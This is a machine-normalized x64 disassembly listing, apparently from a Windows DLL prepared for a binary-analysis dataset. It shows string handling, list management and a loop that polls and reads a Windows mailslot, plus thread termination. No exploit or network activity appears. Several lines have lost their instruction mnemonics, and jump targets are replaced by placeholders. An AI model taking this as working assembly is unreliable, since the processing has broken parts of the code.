mov ecx [ rbp - 0x58 ]
add ecx edi
mov [ rsi + 0x8 ] ecx
cmp [ rbp - 0x50 ] 0x10
jb r-xdata
cmp [ rbp - 0x50 ] 0x10
jb r-xdata
lea rax [ rsp + 0x40 ]
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x58 ] 0xf
mov [ rsp + 0x50 ] r13
mov [ rsp + 0x40 ] 0x0
mov r8d 0x3
lea rdx [ r--data ]
lea rcx [ rsp + 0x40 ]
call sub_180008110
nop
mov [ rbp ] 0xf
mov [ rbp - 0x8 ] r13
mov [ rbp - 0x18 ] 0x0
mov r8d 0x1
lea rdx [ r--data ]
lea rcx [ rbp - 0x18 ]
call sub_180008110
nop
lea r9 [ rsp + 0x40 ]
lea r8 [ rbp - 0x18 ]
lea rdx [ rbp - 0x68 ]
mov rcx r12
call sub_18000df80
test al al
jne r-xdata
cmp [ rbp - 0x78 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x10 ]
call j_sub_18002094c#2
nop
cmp [ rbp + 0x50 ] 0x10
jb r-xdata
mov rcx [ rbp - 0x68 ]
call j_sub_18002094c#2
nop
mov [ rbp - 0x50 ] 0xf
mov [ rbp - 0x58 ] r13
mov [ rbp - 0x68 ] 0x0
cmp [ rbp + 0x50 ] 0x10
jb r-xdata
mov rcx [ rbp - 0x68 ]
call j_sub_18002094c#2
cmp [ rbp - 0x50 ] 0x10
jb r-xdata
mov [ rbp - 0x78 ] 0x7
mov [ rbp - 0x80 ] r13
mov [ rsp + 0x70 ] r13w
jmp r-xdata
mov rcx [ rsp + 0x70 ]
call j_sub_18002094c#2
cmp [ rbp + 0x28 ] 0x10
jb r-xdata
mov rcx [ rbp + 0x38 ]
call j_sub_18002094c#2
nop
cmp [ rbp + 0x28 ] 0x10
jb r-xdata
mov rcx [ rbp + 0x38 ]
call j_sub_18002094c#2
nop
mov [ rbp - 0x50 ] 0xf
mov [ rbp - 0x58 ] r13
mov [ rbp - 0x68 ] 0x0
cmp [ rbp + 0x50 ] 0x10
jb r-xdata
mov rcx [ rbp - 0x68 ]
call j_sub_18002094c#2
cmp [ rbp - 0x28 ] 0x10
jb r-xdata
cmp [ rbp - 0x78 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x10 ]
call j_sub_18002094c#2
nop
cmp [ rbp - 0x78 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x10 ]
call j_sub_18002094c#2
nop
cmp [ rbp + 0x28 ] 0x10
jb r-xdata
mov rcx [ rbp + 0x38 ]
call j_sub_18002094c#2
nop
mov rcx [ rbp + 0x60 ]
xor rcx rsp
call sub_1800212e0
mov rbx [ rsp + 0x1b0 ]
add rsp 0x170
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rcx [ rbp - 0x40 ]
call j_sub_18002094c#2
mov [ rbp - 0x78 ] 0x7
mov [ rbp - 0x80 ] r13
mov [ rsp + 0x70 ] r13w
mov rcx [ rsp + 0x70 ]
call j_sub_18002094c#2
mov [ rbp - 0x78 ] 0x7
mov [ rbp - 0x80 ] r13
mov [ rsp + 0x70 ] r13w
jmp r-xdata
mov rcx [ rsp + 0x70 ]
call j_sub_18002094c#2
cmp [ rbp - 0x78 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x10 ]
call j_sub_18002094c#2
nop
mov [ rbp - 0x78 ] 0x7
mov [ rbp - 0x80 ] r13
mov [ rsp + 0x70 ] r13w
jmp r-xdata
mov rcx [ rsp + 0x70 ]
call j_sub_18002094c#2
sub_180010a80
push rbp
push rdi
sub rsp 0x28
mov rbp [ rcx + 0x60 ]
mov rdi rcx
test rbp rbp
jne r-xdata
mov rax [ rcx + 0x58 ]
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x48 ] rsi
mov rbx [ rax ]
mov [ rsp + 0x50 ] r12
xor esi esi
mov [ rsp + 0x20 ] r14
mov r14d [ rcx + 0x38 ]
cmp rbx rax
je r-xdata
xor eax eax
add rsp 0x28
pop rdi
pop rbp
retn
mov ecx esi
mov edx 0x1
call sub_180021308
mov r12 rax
test rax rax
je r-xdata
mov rdx [ rbx + 0x10 ]
mov rcx rdi
call sub_180010460
mov r11 [ rbx + 0x10 ]
mov rbx [ rbx ]
add esi [ r11 + 0x8 ]
cmp rbx [ rdi + 0x58 ]
jne r-xdata
mov r12 [ rsp + 0x50 ]
mov rsi [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
mov r14 [ rsp + 0x20 ]
add rsp 0x28
pop rdi
pop rbp
retn
mov [ rsp + 0x58 ] r13
mov r13 rax
test ebp ebp
je r-xdata
mov ecx 0x18
call sub_180021000
mov r13 [ rsp + 0x58 ]
mov r11 rax
test rax rax
je r-xdata
mov ebx ebp
nop [ rax + rax ] ax
xor r11d r11d
movzx eax [ rw-data ]
mov [ r11 + 0x6 ] 0x64
mov [ r11 + 0x8 ] r12
mov [ r11 + 0x4 ] ax
movzx eax [ rw-data ]
mov [ r11 + 0x10 ] r14
mov [ r11 + 0x7 ] al
mov [ r11 ] 0x0
jmp r-xdata
mov rcx rsi
call j_sub_18002094c#2
mov r11 [ rdi + 0x58 ]
mov rcx [ r11 ]
cmp rcx r11
je r-xdata
call sub_18002094c
sub [ rdi + 0x38 ] r14d
mov rax r11
dec rbx
jne r-xdata
mov rdx [ rcx + 0x8 ]
mov rax [ rcx ]
mov [ rdx ] rax
mov rdx [ rcx ]
mov rax [ rcx + 0x8 ]
mov [ rdx + 0x8 ] rax
call j_sub_18002094c#2
dec [ rdi + 0x60 ]
mov rax [ rdi + 0x58 ]
mov rcx [ rax ]
mov rsi [ rcx + 0x10 ]
mov rcx r13
mov r8d [ rsi + 0x8 ]
mov rdx [ rsi ]
call sub_1800205e0
mov r11d [ rsi + 0x8 ]
mov rcx [ rsi ]
add r13 r11
test rcx rcx
je r-xdata
sub_180010be0
mov rax rsp
push rbp
push r12
push r13
push r14
push r15
lea rbp [ rax - 0x3d8 ]
sub rsp 0x4b0
mov [ rbp - 0x58 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x3a0 ] rax
mov rdi rcx
xor r15d r15d
mov [ rsp + 0x40 ] r15d
cmp [ rcx + 0x90 ] r15
je r-xdata
mov rcx [ rbp + 0x3a0 ]
xor rcx rsp
call sub_1800212e0
lea r11 [ rsp + 0x4b0 ]
mov rbx [ r11 + 0x38 ]
mov rsi [ r11 + 0x40 ]
mov rdi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
lea ecx [ r15 + 0x30 ]
call sub_180021000
mov [ rsp + 0x48 ] rax
test rax rax
je r-xdata
mov rsi r15
mov rcx rax
call sub_180017520
mov rsi rax
jmp r-xdata
mov rax [ rax ]
mov rax r15
jmp r-xdata
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx rsi
call sub_1800175a0
lea rax [ rdi + 0xa0 ]
mov [ rsp + 0x48 ] rax
mov rcx rax
call sub_180020274
lea rax [ rdi + 0x70 ]
mov [ rsp + 0x50 ] rax
lea rdx [ rbp + 0xb0 ]
mov rcx rax
call sub_1800134c0
mov rcx rax
mov rax [ rax ]
test rax rax
jne r-xdata
mov rax [ rax + 0x8 ]
mov rcx [ rax + rcx * 8 ]
mov rbx r15
mov [ rsp + 0x30 ] rbx
mov r14 r15
mov [ rsp + 0x38 ] r15
mov rdx [ rcx + 0x8 ]
mov r8 [ rcx ]
test rdx rdx
je r-xdata
sub rcx rdx
mov rcx [ rcx + 0x10 ]
mov rdx [ rax + 0x10 ]
cmp rdx rcx
ja r-xdata
movzx eax [ rbx + 0x6 ]
add eax 0xffffff9b
or r13 0xffffffffffffffff
cmp eax 0x8
ja r-xdata
mov eax [ rdx + 0x8 ]
test eax eax
je r-xdata
mov r8d 0x30
lea rdx [ rw-data ]
mov rcx rsi
call sub_180017590
lea rdx [ rbp + 0x370 ]
mov rcx rsi
call sub_180017d20
mov rbx rax
lea rdx [ rbp + 0x230 ]
mov rcx rsi
call sub_180017d20
nop
cmp [ rax + 0x18 ] 0x10
jb r-xdata
cdqe
lea rdx [ __dos_header ]
mov ecx [ rdx + rax * 4 + 0x117c8 ]
add rcx rdx
jmp rcx
mov rbx [ rsp + 0x30 ]
mov r14 [ rsp + 0x38 ]
nop [ rax ] eax
mov r8d [ rbx + 0x10 ]
mov rdx rax
mov rcx rdi
call sub_18000f840
nop
cmp [ rbp + 0x248 ] 0x10
jb r-xdata
mov rax [ rax ]
mov rcx rdi
call sub_18000bd10
test al al
je r-xdata
cmp [ rdi + 0x40 ] 0x0
je r-xdata
cmp [ rbx + 0x10 ] 0x4
jne r-xdata
lea rcx [ rdi + 0x10 ]
call sub_18000b280
mov [ rdi + 0xa8 ] eax
mov r8d 0x38
lea rdx [ rw-data ]
mov rcx rsi
call sub_180017590
lea rdx [ rbp + 0xc8 ]
mov rcx rsi
call sub_180017d20
nop
mov r8 [ rbp + 0xd8 ]
test r8 r8
je r-xdata
cmp [ rbx + 0x10 ] 0x4
jne r-xdata
mov [ rdi + 0x48 ] 0x1
jmp r-xdata
cmp [ rdi + 0x40 ] 0x0
je r-xdata
cmp [ rdi + 0x40 ] 0x0
je r-xdata
cmp [ rdi + 0x40 ] 0x0
je r-xdata
mov r14 rdx
mov [ rsp + 0x38 ] rdx
mov rbx r8
mov [ rsp + 0x30 ] rbx
jmp r-xdata
mov eax [ rdx + 0x8 ]
test eax eax
jne r-xdata
mov [ rbp + 0x248 ] 0xf
mov [ rbp + 0x240 ] r15
mov [ rbp + 0x230 ] 0x0
cmp [ rbp + 0x388 ] 0x10
jb r-xdata
mov rcx [ rbp + 0x230 ]
call j_sub_18002094c#2
mov rcx [ rsp + 0x50 ]
call sub_180008480
mov rcx [ rsp + 0x48 ]
call sub_18002027c
test rsi rsi
je r-xdata
mov [ rbp - 0x68 ] 0x7
mov [ rbp - 0x70 ] r15
mov [ rbp - 0x80 ] r15w
xor r8d r8d
lea rdx [ r--data ]
lea rcx [ rbp - 0x80 ]
call sub_180003930
mov rcx [ rdi + 0x30 ]
mov rax [ rcx ]
mov r9d [ rw-data ]
lea r8 [ rbp - 0x80 ]
mov edx 0x1
call [ rax + 0x10 ]
jmp r-xdata
mov [ rsp + 0x70 ] 0x7
mov [ rsp + 0x68 ] r15
mov [ rsp + 0x58 ] r15w
xor r8d r8d
lea rdx [ r--data ]
lea rcx [ rsp + 0x58 ]
call sub_180003930
mov rcx [ rdi + 0x30 ]
mov rax [ rcx ]
mov r9d [ rw-data ]
lea r8 [ rsp + 0x58 ]
xor edx edx
call [ rax + 0x10 ]
xor edx edx
mov rcx [ rdi + 0x40 ]
call [ TerminateThread@IAT ]
mov rcx [ rdi + 0x40 ]
call [ CloseHandle@IAT ]
mov [ rdi + 0x40 ] r15
mov rbx [ rdi + 0x50 ]
test rbx rbx
je r-xdata
mov rax [ rbx + 0x8 ]
mov ecx [ rax ]
mov [ rdi + 0x3c ] ecx
jmp r-xdata
mov rbx r13
lea r12 [ rbp + 0xc8 ]
mov rdx [ rbp + 0xc8 ]
mov rax [ rbp + 0xe0 ]
cmp rax 0x10
cmovae r12 rdx
add r12 r8
lea rbx [ rbp + 0xc8 ]
cmp rax 0x10
cmovae rbx rdx
cmp rbx r12
jae r-xdata
mov rcx rdi
mov rax [ rbx + 0x8 ]
mov edx [ rax ]
cmp edx [ rdi + 0xa8 ]
ja r-xdata
mov r12 [ rbx + 0x10 ]
cmp r12 0x104
jae r-xdata
mov r12 [ rbx + 0x10 ]
cmp r12 0x104
jae r-xdata
mov r8d 0x30
lea rdx [ rw-data ]
mov rcx rsi
call sub_180017590
lea rdx [ rbp + 0xf0 ]
mov rcx rsi
call sub_180017d20
nop
mov r8d 0x5
lea rdx [ rw-data ]
mov rcx rsi
call sub_180017590
lea rdx [ rbp + 0x140 ]
mov rcx rsi
call sub_180017d20
nop
mov r8d 0x6
lea rdx [ rw-data ]
mov rcx rsi
call sub_180017590
lea rdx [ rbp + 0x118 ]
mov rcx rsi
call sub_180017d20
nop
mov rax [ rdi + 0x50 ]
mov rbx [ rax + 0x40 ]
mov rbx [ rbx ]
cmp rbx [ rax + 0x40 ]
je r-xdata
lea ecx [ rax + 0x1 ]
[ rdx + 0x8 ] ecx
je r-xdata
jmp r-xdata
mov rcx [ rbp + 0x370 ]
test r14 r14
je r-xdata
mov rcx rsi
call sub_180017560
mov rcx rsi
call j_sub_18002094c#2
nop
mov rcx rbx
call sub_180012e60
mov rcx rbx
jmp r-xdata
mov rax [ rbp - 0x40 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rbp + rcx - 0x40 ] rax
mov rax [ rbp - 0x50 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rbp + rcx - 0x50 ] rax
mov rax [ rbp - 0x50 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rbp + rcx - 0x50 ] rax
lea rcx [ rbp - 0x38 ]
call sub_18000c770
nop
lea rax [ r--data ]
mov [ rbp - 0x38 ] rax
mov [ rbp + 0x38 ] r15
mov [ rbp + 0x40 ] r15d
mov edx [ rdi + 0xa8 ]
lea rcx [ rbp - 0x40 ]
call sub_18000e080
lea rdx [ rbp + 0x320 ]
lea rcx [ rbp - 0x50 ]
call sub_18000f920
nop
mov [ rsp + 0x20 ] r13
xor r9d r9d
mov r8 rax
mov rdx rbx
lea rcx [ rbp + 0xc8 ]
call sub_180007c20
nop
cmp [ rbp + 0x338 ] 0x10
jb r-xdata
mov edx [ rbp + 0x58 ]
or edx 0x4
xor r8d r8d
lea rcx [ rbp + 0x48 ]
call sub_18000ba70
nop
nop [ rax + rax ] ax
mov rcx rdi
test edx edx
je r-xdata
mov rcx r12
shr rcx 0x1
add rcx 0x4
mov edx 0x2
call sub_180021308
mov r15 rax
mov r8 r12
mov rdx [ rbx + 0x8 ]
mov rcx rax
call sub_1800205e0
mov rdx r15
mov rcx [ rdi + 0x50 ]
call sub_1800131d0
mov r8d 0x2f
mov rcx rsi
test al al
jne r-xdata
mov rcx r12
shr rcx 0x1
add rcx 0x4
mov edx 0x2
call sub_180021308
mov r15 rax
mov r8 r12
mov rdx [ rbx + 0x8 ]
mov rcx rax
call sub_1800205e0
mov rdx r15
mov rcx [ rdi + 0x50 ]
call sub_180012c60
mov rcx rsi
test al al
jne r-xdata
mov r8d 0x6
lea rdx [ rw-data ]
mov rcx rsi
call sub_180017590
lea rdx [ rbp + 0x1e0 ]
mov rcx rsi
call sub_180017d20
nop
mov r9 r13
xor r8d r8d
mov rdx rax
lea rcx [ rbp + 0xf0 ]
call sub_180007b00
nop
cmp [ rbp + 0x1f8 ] 0x10
jb r-xdata
lea r8 [ rbx + 0x18 ]
lea rdx [ rbp + 0x140 ]
lea rcx [ rbp + 0x190 ]
call sub_18000f740
nop
lea r8 [ rbp + 0x118 ]
mov rdx rax
lea rcx [ rbp + 0x2f8 ]
call sub_18000f7f0
nop
mov r9 r13
xor r8d r8d
mov rdx rax
lea rcx [ rbp + 0xf0 ]
call sub_180007b00
nop
cmp [ rbp + 0x310 ] 0x10
jb r-xdata
[ r14 + 0x8 ]
jne r-xdata
call j_sub_18002094c#2
mov [ rbp + 0x338 ] 0xf
mov [ rbp + 0x330 ] r15
mov [ rbp + 0x320 ] 0x0
lea rdx [ rbp + 0xc8 ]
cmp [ rbp + 0xe0 ] 0x10
cmovae rdx [ rbp + 0xc8 ]
mov r8d [ rbp + 0xd8 ]
mov rcx rdi
call sub_18000f840
mov [ rdi + 0x48 ] 0x1
lea rcx [ rbp + 0x48 ]
call sub_18000cbe0
lea r11 [ r--data ]
mov [ rbp + 0x48 ] r11
lea rcx [ rbp + 0x48 ]
call sub_1800200a0
nop
cmp [ rbp + 0xe0 ] 0x10
jb r-xdata
mov rcx [ rbp + 0x320 ]
call j_sub_18002094c#2
lea rax [ rbp + 0xc8 ]
cmp [ rbp + 0xe0 ] 0x10
cmovae rax [ rbp + 0xc8 ]
sub rbx rax
jmp r-xdata
inc rbx
cmp rbx r12
jb r-xdata
xor edx edx
dec edx
jmp r-xdata
lea rdx [ rw-data ]
call sub_180017590
lea rdx [ rbp + 0x1b8 ]
mov rcx rsi
call sub_180017d20
mov rbx rax
lea rdx [ rbp + 0x168 ]
mov rcx rsi
call sub_180017d20
nop
cmp [ rax + 0x18 ] 0x10
jb r-xdata
lea rdx [ rw-data ]
call sub_180017590
lea rdx [ rbp + 0x2d0 ]
mov rcx rsi
call sub_180017d20
mov rbx rax
lea rdx [ rbp + 0x280 ]
mov rcx rsi
call sub_180017d20
nop
cmp [ rax + 0x18 ] 0x10
jb r-xdata
mov r8d 0x2f
lea rdx [ rw-data ]
call sub_180017590
lea rdx [ rbp + 0x258 ]
mov rcx rsi
call sub_180017d20
mov rbx rax
lea rdx [ rbp + 0x348 ]
mov rcx rsi
call sub_180017d20
nop
cmp [ rax + 0x18 ] 0x10
jb r-xdata
mov r8d 0x32
lea rdx [ rw-data ]
call sub_180017590
lea rdx [ rbp + 0x208 ]
mov rcx rsi
call sub_180017d20
mov rbx rax
lea rdx [ rbp + 0x2a8 ]
mov rcx rsi
call sub_180017d20
nop
cmp [ rax + 0x18 ] 0x10
jb r-xdata
mov [ rbp + 0x1f8 ] 0xf
mov [ rbp + 0x1f0 ] r15
mov [ rbp + 0x1e0 ] 0x0
lea rdx [ rbp + 0xf0 ]
cmp [ rbp + 0x108 ] 0x10
cmovae rdx [ rbp + 0xf0 ]
mov r8d [ rbp + 0x100 ]
mov rcx rdi
call sub_18000f840
nop
cmp [ rbp + 0x130 ] 0x10
jb r-xdata
mov rcx [ rbp + 0x1e0 ]
call j_sub_18002094c#2
mov [ rbp + 0x310 ] 0xf
mov [ rbp + 0x308 ] r15
mov [ rbp + 0x2f8 ] 0x0
cmp [ rbp + 0x1a8 ] 0x10
jb r-xdata
mov rcx [ rbp + 0x2f8 ]
call j_sub_18002094c#2
mov rbx [ rsp + 0x38 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rcx [ rbp + 0xc8 ]
jmp r-xdata
movsxd rbx ebx
mov r8d 0x1
mov rdx rbx
lea rcx [ rbp + 0xc8 ]
call sub_1800074e0
lea r11 [ r--data ]
mov [ rbp - 0x50 ] r11
lea rax [ r--data ]
mov [ rbp - 0x40 ] rax
mov [ rsp + 0x40 ] 0x1
lea rax [ r--data ]
mov [ rbp + 0x48 ] rax
mov [ rbp - 0x48 ] r15
lea rcx [ rbp + 0x48 ]
call sub_18000bc00
lea r11 [ rbp - 0x38 ]
mov [ rbp + 0x90 ] r11
mov [ rbp + 0x98 ] r15
mov dl 0x20
lea rcx [ rbp + 0x48 ]
call sub_18000d900
mov [ rbp + 0xa0 ] al
cmp [ rbp + 0x90 ] 0x0
jne r-xdata
movsx edx [ rbx ]
mov r8d 0x1
lea rcx [ r--data ]
call sub_1800215e8
test rax rax
jne r-xdata
jmp r-xdata
call sub_180010200
mov r8d [ rbx + 0x10 ]
mov rdx rax
mov rcx rdi
call sub_18000f840
nop
cmp [ rbp + 0x180 ] 0x10
jb r-xdata
mov rax [ rax ]
mov r8d [ rbx + 0x10 ]
mov rdx rax
mov rcx rdi
call sub_18000f840
nop
cmp [ rbp + 0x298 ] 0x10
jb r-xdata
mov rax [ rax ]
mov r8d [ rbx + 0x10 ]
mov rdx rax
mov rcx rdi
call sub_18000f840
nop
cmp [ rbp + 0x360 ] 0x10
jb r-xdata
mov rax [ rax ]
mov r8d [ rbx + 0x10 ]
mov rdx rax
mov rcx rdi
call sub_18000f840
nop
cmp [ rbp + 0x2c0 ] 0x10
jb r-xdata
mov rax [ rax ]
mov [ rbp + 0x130 ] 0xf
mov [ rbp + 0x128 ] r15
mov [ rbp + 0x118 ] 0x0
cmp [ rbp + 0x158 ] 0x10
jb r-xdata
mov rcx [ rbp + 0x118 ]
call j_sub_18002094c#2
mov [ rbp + 0x1a8 ] 0xf
mov [ rbp + 0x1a0 ] r15
mov [ rbp + 0x190 ] 0x0
mov rbx [ rbx ]
mov rax [ rdi + 0x50 ]
cmp rbx [ rax + 0x40 ]
jne r-xdata
mov rcx [ rbp + 0x190 ]
call j_sub_18002094c#2
mov rcx [ rsp + 0x38 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
mov [ rbp + 0x180 ] 0xf
xor ebx ebx
mov [ rbp + 0x178 ] rbx
mov [ rbp + 0x168 ] bl
cmp [ rbp + 0x1d0 ] 0x10
jb r-xdata
mov rcx [ rbp + 0x168 ]
call j_sub_18002094c#2
mov [ rbp + 0x298 ] 0xf
xor ebx ebx
mov [ rbp + 0x290 ] rbx
mov [ rbp + 0x280 ] bl
cmp [ rbp + 0x2e8 ] 0x10
jb r-xdata
mov rcx [ rbp + 0x280 ]
call j_sub_18002094c#2
mov [ rbp + 0x360 ] 0xf
xor ebx ebx
mov [ rbp + 0x358 ] rbx
mov [ rbp + 0x348 ] bl
cmp [ rbp + 0x270 ] 0x10
jb r-xdata
mov rcx [ rbp + 0x348 ]
call j_sub_18002094c#2
mov [ rbp + 0x2c0 ] 0xf
xor ebx ebx
mov [ rbp + 0x2b8 ] rbx
mov [ rbp + 0x2a8 ] bl
cmp [ rbp + 0x220 ] 0x10
jb r-xdata
mov rcx [ rbp + 0x2a8 ]
call j_sub_18002094c#2
mov [ rbp + 0x158 ] 0xf
mov [ rbp + 0x150 ] r15
mov [ rbp + 0x140 ] 0x0
cmp [ rbp + 0x108 ] 0x10
jb r-xdata
mov rcx [ rbp + 0x140 ]
call j_sub_18002094c#2
mov [ rbp + 0x1d0 ] 0xf
mov [ rbp + 0x1c8 ] rbx
mov [ rbp + 0x1b8 ] 0x0
mov rcx [ rbp + 0x1b8 ]
call j_sub_18002094c#2
mov [ rbp + 0x2e8 ] 0xf
mov [ rbp + 0x2e0 ] rbx
mov [ rbp + 0x2d0 ] 0x0
jmp r-xdata
mov rcx [ rbp + 0x2d0 ]
call j_sub_18002094c#2
mov [ rbp + 0x270 ] 0xf
mov [ rbp + 0x268 ] rbx
mov [ rbp + 0x258 ] 0x0
mov rcx [ rbp + 0x258 ]
call j_sub_18002094c#2
mov [ rbp + 0x220 ] 0xf
mov [ rbp + 0x218 ] rbx
mov [ rbp + 0x208 ] 0x0
jmp r-xdata
mov rcx [ rbp + 0x208 ]
call j_sub_18002094c#2
mov rcx [ rbp + 0xf0 ]
jmp r-xdata
mov rcx r15
call sub_18002094c
jmp r-xdata
mov rcx r15
call sub_18002094c
jmp r-xdata
sub_1800117f0
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov rdi rcx
lea rax [ r--data ]
mov [ rcx ] rax
mov rcx [ rcx + 0x30 ]
call j_sub_18002094c#2
lea rcx [ rdi + 0xa0 ]
call sub_180020254
nop
lea rbx [ rdi + 0x70 ]
mov [ rsp + 0x48 ] rbx
mov rcx rbx
call sub_1800087f0
nop
mov rcx [ rbx ]
call j_sub_18002094c#2
xor r11d r11d
mov [ rbx ] r11
mov rax [ rdi + 0x58 ]
mov rcx [ rax ]
mov [ rax ] rax
mov rax [ rdi + 0x58 ]
mov [ rax + 0x8 ] rax
mov [ rdi + 0x60 ] r11
cmp rcx [ rdi + 0x58 ]
je r-xdata
mov rcx [ rdi + 0x58 ]
call j_sub_18002094c#2
nop
lea rcx [ rdi + 0x10 ]
call sub_18000af90
nop
lea rax [ r--data ]
mov [ rdi ] rax
mov rbx [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
mov rbx [ rcx ]
call j_sub_18002094c#2
mov rcx rbx
cmp rbx [ rdi + 0x58 ]
jne r-xdata
sub_1800118b0
mov rax rsp
push rbp
push rdi
push r12
push r13
push r14
lea rbp [ rax - 0x5f ]
sub rsp 0xe0
mov [ rbp - 0x69 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x2f ] rax
mov rbx rcx
mov ecx 0x30
call sub_180021000
mov [ rbp + 0x1f ] rax
xor r14d r14d
test rax rax
je r-xdata
mov rsi r14
mov rcx rax
call sub_180017520
mov rsi rax
jmp r-xdata
xor r9d r9d
or r8d 0xffffffff
xor edx edx
mov rcx rax
call [ CreateMailslotW@IAT ]
mov r12 rax
cmp [ rbp - 0x21 ] 0x8
jb r-xdata
mov rax [ rax ]
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx rsi
call sub_1800175a0
mov r8d 0x62
lea rdx [ rw-data ]
mov rcx rsi
call sub_180017590
lea rdx [ rbp - 0x39 ]
mov rcx rsi
call sub_180017bc0
cmp [ rax + 0x18 ] 0x8
jb r-xdata
mov [ rbp - 0x21 ] 0x7
mov [ rbp - 0x29 ] r14
mov [ rbp - 0x39 ] r14w
cmp r12 0xffffffffffffffff
jne r-xdata
mov rcx [ rbp - 0x39 ]
call j_sub_18002094c#2
mov [ rbp - 0x49 ] 0x7
mov [ rbp - 0x51 ] r14
mov [ rbp - 0x61 ] r14w
xor r8d r8d
lea rdx [ r--data ]
lea rcx [ rbp - 0x61 ]
call sub_180003930
mov rcx [ rbx + 0x30 ]
mov rax [ rcx ]
mov r8d [ rw-data ]
lea rdx [ rbp - 0x61 ]
call [ rax ]
test eax eax
je r-xdata
test rsi rsi
je r-xdata
mov [ rbp - 0x71 ] r14d
mov [ rbp - 0x75 ] r14d
mov [ rbp - 0x79 ] r14d
mov edx 0x2
mov ecx 0x104
call sub_180021308
mov r13 rax
mov r8d 0x7
lea rdx [ rw-data ]
mov rcx rsi
call sub_180017590
mov [ rbp + 0x17 ] 0x0
xor eax eax
mov [ rbp + 0x18 ] eax
mov [ rbp + 0x1c ] ax
lea rdx [ rbp - 0x11 ]
mov rcx rsi
call sub_180017d20
mov rdi rax
lea rdx [ rbp - 0x61 ]
mov rcx rsi
call sub_180017d20
cmp [ rax + 0x18 ] 0x10
jb r-xdata
mov rcx rbx
call sub_18000bd10
xor edx edx
mov rcx rbx
call sub_180010200
xor eax eax
jmp r-xdata
mov rcx rsi
call sub_180017560
mov rcx rsi
call j_sub_18002094c#2
mov r8 [ rdi + 0x10 ]
mov rdx rax
lea rcx [ rbp + 0x17 ]
call sub_1800205e0
cmp [ rbp - 0x49 ] 0x10
jb r-xdata
mov rax [ rax ]
mov rcx [ rbp + 0x2f ]
xor rcx rsp
call sub_1800212e0
lea r11 [ rsp + 0xe0 ]
mov rbx [ r11 + 0x38 ]
mov rsi [ r11 + 0x40 ]
mov rsp r11
pop r14
pop r13
pop r12
pop rdi
pop rbp
retn
mov [ rbp - 0x49 ] 0xf
mov [ rbp - 0x51 ] r14
mov [ rbp - 0x61 ] 0x0
cmp [ rbp + 0x7 ] 0x10
jb r-xdata
mov rcx [ rbp - 0x61 ]
call j_sub_18002094c#2
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx rsi
call sub_1800175a0
mov r8d 0xe
lea rdx [ rw-data ]
mov rcx rsi
call sub_180017590
mov [ rbp + 0x1f ] 0x0
xor eax eax
mov [ rbp + 0x20 ] rax
mov [ rbp + 0x28 ] eax
mov [ rbp + 0x2c ] al
lea rdx [ rbp - 0x11 ]
mov rcx rsi
call sub_180017d20
mov rdi rax
lea rdx [ rbp - 0x61 ]
mov rcx rsi
call sub_180017d20
cmp [ rax + 0x18 ] 0x10
jb r-xdata
mov rcx [ rbp - 0x11 ]
call j_sub_18002094c#2
mov r8 [ rdi + 0x10 ]
mov rdx rax
lea rcx [ rbp + 0x1f ]
call sub_1800205e0
cmp [ rbp - 0x49 ] 0x10
jb r-xdata
mov rax [ rax ]
mov [ rbp - 0x49 ] 0xf
mov [ rbp - 0x51 ] r14
mov [ rbp - 0x61 ] 0x0
cmp [ rbp + 0x7 ] 0x10
jb r-xdata
mov rcx [ rbp - 0x61 ]
call j_sub_18002094c#2
test rsi rsi
je r-xdata
mov rcx [ rbp - 0x11 ]
call j_sub_18002094c#2
mov ecx 0x14
call [ Sleep@IAT ]
mov [ rsp + 0x20 ] r14
lea r9 [ rbp - 0x75 ]
lea r8 [ rbp - 0x71 ]
xor edx edx
mov rcx r12
call [ GetMailslotInfo@IAT ]
cmp [ rbp - 0x75 ] 0x0
je r-xdata
mov rcx rsi
call sub_180017560
mov rcx rsi
call j_sub_18002094c#2
nop [ rax ] eax
mov ecx 0x14
call [ Sleep@IAT ]
xor edx edx
mov r8d 0x104
mov rcx r13
call sub_180021150
mov [ rbp - 0x79 ] r14d
mov [ rsp + 0x20 ] r14
lea r9 [ rbp - 0x79 ]
mov r8d [ rbp - 0x71 ]
mov rdx r13
mov rcx r12
call [ ReadFile@IAT ]
xor eax eax
or rcx 0xffffffffffffffff
lea rdi [ rbp + 0x17 ]
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rdx [ rbp + 0x17 ]
mov rcx r13
call sub_180021890
mov rcx rbx
test eax eax
jne r-xdata
mov r8d [ rbp - 0x79 ]
mov rdx r13
call sub_18000f840
xor eax eax
or rcx 0xffffffffffffffff
lea rdi [ rbp + 0x1f ]
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rdx [ rbp + 0x1f ]
mov rcx rbx
call sub_18000f840
jmp r-xdata
or edx 0xffffffff
call sub_180010200
jmp r-xdata
mov rcx rbx
call sub_180010be0
jmp r-xdata
sub_180011c50
push rbx
sub rsp 0x20
mov eax [ rcx + 0x3c ]
mov rbx rcx
cmp [ rcx + 0x38 ] eax
jbe r-xdata
cmp [ rcx + 0x48 ] 0x0
je r-xdata
